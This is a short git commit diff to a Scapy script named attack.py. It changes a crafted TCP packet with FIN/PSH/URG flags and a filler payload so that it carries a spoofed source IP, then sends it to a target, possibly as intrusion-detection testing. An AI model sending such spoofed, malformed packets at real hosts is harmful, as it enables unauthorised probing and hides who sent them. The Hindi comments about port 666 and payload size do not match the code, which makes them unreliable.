6730f4f78c1e50600a329e429e290ccfc4d457e2
Nilesh Dewangan <nileshdewangan042@gmail.com>
2026-04-05 16:30:33 +0530

    Update attack.py

--- attack.py
+++ attack.py
@@ -7,7 +7,7 @@ print(f"🔥 Sending Attack Packets to {target_ip}...")
 
 # Attack Packet: Port 666 (Suspicious) + Safe Size (1000 bytes)
 # Note: Humne size 50000 se kam karke 1000 kiya hai taaki Error na aaye.
-packet = IP(dst=target_ip)/TCP(dport=80, flags="FPU")/Raw(load="X"*15000)
+packet = IP(src="45.33.22.11", dst=target_ip)/TCP(dport=80, flags="FPU")/Raw(load="X"*1500)
 
 send(packet, verbose=False)
 print("✅ Attack Sent!")
